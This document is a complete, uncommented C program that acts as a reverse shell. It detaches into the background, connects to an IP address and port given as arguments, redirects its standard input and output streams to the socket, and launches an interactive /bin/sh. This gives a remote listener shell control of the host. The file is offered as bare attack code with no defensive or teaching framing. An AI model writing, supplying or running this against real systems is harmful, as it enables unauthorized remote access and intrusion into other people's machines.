#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
int main(int argc, char *argv[]) {
    int fd;
    struct sockaddr_in sin;
    daemon(1,0);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(atoi(argv[2]));
    sin.sin_addr.s_addr = inet_addr(argv[1]);
    fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) ;
    if ((connect(fd, (struct sockaddr *) &sin, sizeof(struct sockaddr)))<0) {
        perror("Connect fail");
        return 0;
    }
    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);
    system("/bin/sh -i");
    close(fd);
}
